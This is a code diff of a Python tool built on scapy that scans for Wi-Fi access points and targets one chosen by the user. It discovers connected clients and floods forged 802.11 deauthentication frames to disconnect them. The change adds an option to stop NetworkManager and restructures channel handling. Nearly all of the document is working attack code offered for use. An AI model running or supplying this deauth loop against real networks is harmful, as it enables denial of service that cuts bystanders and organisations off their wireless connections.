@@ -2,7 +2,7 @@
 
 import argparse
 import pkg_resources
-import copy
+import traceback
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
@@ -12,21 +12,20 @@ from utils import *
 
 conf.verb = 0
 BANNER = """
- __      __ __  _____ __          ________                        __   __     
-/  \    /  \__|/ ____\__|         \___    \   ____ _____   __ ___/  |_|  |__  
-\   \/\/   /  \   __\|  |  ______  |       \_/ ___ \\__  \ |  |  \   __\  |  \ 
- \        /|  ||  |  |  | /_____/  |__      \  ___/ / __ \|  |  /|  | |   Y  \\
-  \__/\__/ |__||__|  |__|         /_________/\_____/______/____/ |__| |___|__/ 
+ __      __ __  _____ __         _________                        __   __     
+/  \    /  \__|/ ____\__|        \    __  \   ____ _____   __ ___/  |_|  |__  
+\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \\__  \ |  |  \   __\  |  \ 
+ \        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ / __ \|  |  /|  | |   Y  \\
+  \__/\__/ |__||__|  |__|        /________/  \_____/______/____/ |__| |___|__/ 
 """
 
 
 class Interceptor:
     _BROADCAST_MACADDR = "ff:ff:ff:ff:ff:ff"
 
-    def __init__(self, net_iface, skip_monitor_mode_setup, *args, **kwargs):
+    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, *args, **kwargs):
         self.interface = net_iface
         self._channel_sniff_timeout = 2
-        self._max_miss_counter = 3
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
         self._printf_res_intv = 1
@@ -40,7 +39,6 @@ class Interceptor:
 
         self.target_ssid = str()
         self._active_aps = defaultdict(dict)
-        self._duplicates = defaultdict(int)
 
         if not skip_monitor_mode_setup:
             printf("[*] Setting up monitor mode...")
@@ -50,6 +48,11 @@ class Interceptor:
             printf("[*] Monitor mode was set up successfully")
         else:
             printf("[*] Skipping monitor mode setup...")
+
+        if kill_networkmanager:
+            printf("[*] Killing NetworkManager...")
+            if not self._kill_networkmanager():
+                printf("[!] Failed to kill NetworkManager...")
 
         self._channel_range = self._get_channels()
 
@@ -62,57 +65,38 @@ class Interceptor:
                 return False
         return True
 
-    def _set_channel(self, ch_num, ch_freq):
+    @staticmethod
+    def _kill_networkmanager():
+        cmd = 'systemctl stop NetworkManager'
+        printf(f"[>] Running command -> '{cmd}'")
+        return not os.system(cmd)
+
+    def _set_channel(self, ch_num):
         os.system(f"iw dev {self.interface} set channel {ch_num}")
-        # TODO for x in sudo iwlist wlan0 channel
         self._current_channel_num = ch_num
-        self._current_channel_freq = ch_freq
 
-    def _get_channels(self):
-        channels = list()
-        for channel in os.popen(f'iwlist {self.interface} channel').readlines():
-            if 'Channel' in channel and 'Current' not in channel:
-                ch_data = channel.split('Channel')[1]
-                ch_num, ch_freq = ch_data.split(':')
-                ch_num = int(ch_num.strip())
-                ch_freq = ch_freq.strip()
-                ch_freq = 2.4 if ch_freq.startswith('2') else 5  # note only supports 2.4 and 5 atm
-                channels.append(tuple([ch_num, ch_freq]))
-
-        return channels
+    def _get_channels(self) -> List[int]:
+        return [int(channel.split('Channel')[1].split(':')[0].strip())
+                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
+                if 'Channel' in channel and 'Current' not in channel]
 
     def _ap_sniff_cb(self, pkt):
         try:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
-                if ap_mac == self._BROADCAST_MACADDR:  # TODO should not happen for these pkt types
+                if ap_mac == self._BROADCAST_MACADDR:
                     return
                 if ssid not in self._active_aps:
-                    self._duplicates[ssid] = 0
-                    self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num,
-                                                                self._current_channel_freq)
+                    self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
                     printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
-                elif self._active_aps[ssid + self._duplicates[ssid] * ' ']["mac_addr"] != ap_mac and \
-                        self._active_aps[ssid + self._duplicates[ssid] * ' ']["channel"] != self._current_channel_num and \
-                        self._active_aps[ssid + self._duplicates[ssid] * ' ']["freq"] != self._current_channel_freq:
-                    self._duplicates[ssid] += 1
-                    mod_ssid = ssid + self._duplicates[ssid] * ' '
-                    self._active_aps[mod_ssid] = self._init_ap_dict(ap_mac, self._current_channel_num,
-                                                                    self._current_channel_freq)
-                    printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
-                if pkt.haslayer(Dot11ProbeResp):
-                    c_mac = str(pkt.addr1)
-                    if c_mac not in self._active_aps[ssid]["clients"]:  # TODO check broadcast
-                        self._active_aps[ssid]["clients"].append(c_mac)
-                self._current_channel_aps.add(ssid)  # todo wtf is this
         except:
             pass
 
     def _scan_channels_for_aps(self):
         try:
-            for idx, ch_data in enumerate(self._channel_range):
-                self._set_channel(*ch_data)
+            for idx, ch_num in enumerate(self._channel_range):
+                self._set_channel(ch_num)
                 printf(f"[*] Scanning channel {self._current_channel_num} ({idx + 1} out of {len(self._channel_range)})")
                 sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
         except KeyboardInterrupt:
@@ -122,16 +106,6 @@ class Interceptor:
         printf(f"[*] Starting AP scan, please wait... ({len(self._channel_range)} channels total)")
 
         self._scan_channels_for_aps()
-
-        to_remove = list()
-        for ssid in self._active_aps.keys():
-            if ssid not in self._current_channel_aps:
-                self._active_aps[ssid]["miss_counter"] += 1
-            if self._active_aps[ssid]["miss_counter"] >= self._max_miss_counter:
-                to_remove.append(ssid)
-        for ssid_to_remove in to_remove:
-            del self._active_aps[ssid_to_remove]
-        self._current_channel_aps.clear()
 
         ctr = 0
         target_map = dict()
@@ -148,7 +122,7 @@ class Interceptor:
 
         chosen = -1
         while chosen not in target_map.keys():
-            printf(f">>>>> Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
+            printf(f">>>>> Choose a target from {min(target_map.keys())} <---> {max(target_map.keys())}")
             chosen = int(input())
 
         return target_map[chosen]
@@ -159,18 +133,17 @@ class Interceptor:
     def _clients_sniff_cb(self, pkt):
         try:
             if self._packet_confirms_client(pkt):
-            #if pkt.haslayer(Dot11Elt):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ssid == self.target_ssid:
                     c_mac = pkt.addr1
                     if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
-                        # todo check type of pkt instead
                         self._active_aps[ssid]["clients"].append(c_mac)
         except:
             pass
 
-    def _packet_confirms_client(self, pkt):
+    @staticmethod
+    def _packet_confirms_client(pkt):
         return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
                (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0)
 
@@ -179,43 +152,39 @@ class Interceptor:
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
     
     def _run_deauther(self):
-        # todo add exc hgandling and exit
-        printf(f"[*] Starting de-auth loop...")
+        try:
+            printf(f"[*] Starting de-auth loop...")
 
-        ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]
+            ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]
 
-        rd_frm = RadioTap()
-        deauth_frm = Dot11Deauth(reason=7)
-        while not self._abort:
-            self.attack_loop_count += 1
-            sendp(rd_frm /
-                  Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
-                  deauth_frm,
-                  iface=self.interface)  # todo broadcast works?
-            for client_mac in self._active_aps[self.target_ssid]["clients"]:
+            rd_frm = RadioTap()
+            deauth_frm = Dot11Deauth(reason=7)
+            while not self._abort:
+                self.attack_loop_count += 1
                 sendp(rd_frm /
-                      Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
+                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
                       iface=self.interface)
-                sendp(rd_frm /
-                      Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
-                      deauth_frm,
-                      iface=self.interface)
-                # sendp(rd_frm /
-                #       Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
-                #       deauth_frm,
-                #       iface=self.interface)
-                # sendp(rd_frm /
-                #       Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
-                #       deauth_frm,
-                #       iface=self.interface)  # todo broadcast works? beware you might disconnect the client from other networks
-        sleep(self._deauth_intv)
+                for client_mac in self._active_aps[self.target_ssid]["clients"]:
+                    sendp(rd_frm /
+                          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
+                          deauth_frm,
+                          iface=self.interface)
+                    sendp(rd_frm /
+                          Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
+                          deauth_frm,
+                          iface=self.interface)
+            sleep(self._deauth_intv)
+        except Exception as exc:
+            printf(f"[!] Exception in deauth-loop -> {traceback.format_exc()}")
+            self._abort = True
+            exit(0)
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
         printf(f"[*] Attacking target {self.target_ssid}")
         printf(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
-        self._set_channel(self._active_aps[self.target_ssid]["channel"], self._active_aps[self.target_ssid]["freq"])
+        self._set_channel(self._active_aps[self.target_ssid]["channel"])
         self.target_ssid = self.target_ssid.strip()  # strip() is important for dupes only after setting the channel
 
         for action in [self._run_deauther, self._listen_for_clients]:
@@ -240,13 +209,11 @@ class Interceptor:
             printf(f"[!] User asked to stop, quitting...")
 
     @staticmethod
-    def _init_ap_dict(mac_addr: str, ch: int, freq: int) -> dict:
+    def _init_ap_dict(mac_addr: str, ch: int) -> dict:
         return {
             "channel": ch,
-            "freq": freq,
             "mac_addr": mac_addr,
-            "clients": list(),
-            "miss_counter": 0  # when this reaches self.max_miss_cnt, remove
+            "clients": list()
         }
 
     @staticmethod
@@ -258,8 +225,8 @@ if __name__ == "__main__":
     printf(f"\n{BANNER}\n"
            f"Make sure of the following:\n"
            f"1. You are running as sudo\n"
-           f"2. You are passing a correct network interface (-i / --iface <name>)\n"
-           f"3. Your wireless adapter supports monitor mode (refer to docs)\n\n"  # todo add to docs how to
+           f"2. You kill NetworkManager (run 'sudo systemctl stop NetworkManager' or pass --kill)\n"
+           f"3. Your wireless adapter supports monitor mode (refer to docs)\n\n"
            f"Written by @flashnuke")
     printf(DELIM)
 
@@ -274,15 +241,12 @@ if __name__ == "__main__":
                         action='store', dest="net_iface", metavar="network_interface", required=True)
     parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                         default=False, dest="skip_monitormode", required=False)
+    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
+                        action='store_true', default=False, dest="kill_networkmanager", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
-    attacker = Interceptor(net_iface=pargs.net_iface, skip_monitor_mode_setup=pargs.skip_monitormode)
+    attacker = Interceptor(net_iface=pargs.net_iface,
+                           skip_monitor_mode_setup=pargs.skip_monitormode,
+                           kill_networkmanager=pargs.kill_networkmanager)
     attacker.run()
-
-# TODO
-# todo mode of dot11 a/b/n etc...
-# todo broadcast ??
-# todo reason=7
-# todo type=8, subtype=12,
-# todo kill network manager optional
